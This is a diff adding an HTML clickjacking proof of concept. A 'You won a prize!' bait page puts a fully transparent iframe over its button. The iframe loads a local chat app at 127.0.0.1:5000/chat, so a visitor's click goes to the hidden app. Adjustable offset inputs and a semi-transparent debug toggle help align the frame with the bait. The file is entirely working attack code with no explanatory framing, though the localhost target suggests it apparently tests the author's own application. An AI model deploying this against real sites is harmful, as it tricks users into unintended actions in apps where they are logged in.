@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Win a Prize!</title>
+</head>
+<body style="margin:0; font-family:Arial; background:#f5f5f5;">
+
+    <h1 style="text-align:center; margin-top:40px;">You won a prize! Click below!</h1>
+
+    <button id="bait" style="
+        position:absolute; top:300px; left:50%; transform:translateX(-50%);
+        z-index:1; padding:4px 10px; font-size:13px; cursor:pointer;
+        background:#4a90e2; color:#fff; border:none; border-radius:4px;
+    ">Получить приз</button>
+
+    <iframe id="target" src="http://127.0.0.1:5000/chat" style="
+        position:absolute; top:0px; left:0px;
+        width:1280px; height:800px; border:none;
+        z-index:2; opacity:0; pointer-events:auto;
+    "></iframe>
+
+    <div style="position:fixed; bottom:10px; right:10px; z-index:99; background:#fff; padding:10px; border:1px solid #ccc; font-size:12px;">
+        top <input id="top" type="number" value="275" style="width:60px;">
+        left <input id="left" type="number" value="-275" style="width:60px;">
+        <label><input id="dbg" type="checkbox"> debug (полупрозрачный)</label>
+    </div>
+
+    <script>
+        const frame = document.getElementById('target');
+        const topInput = document.getElementById('top');
+        const leftInput = document.getElementById('left');
+        const dbg = document.getElementById('dbg');
+        function apply() {
+            frame.style.top = topInput.value + 'px';
+            frame.style.left = leftInput.value + 'px';
+            frame.style.opacity = dbg.checked ? '0.4' : '0';
+        }
+        topInput.oninput = apply; leftInput.oninput = apply; dbg.onchange = apply;
+    </script>
+</body>
+</html>
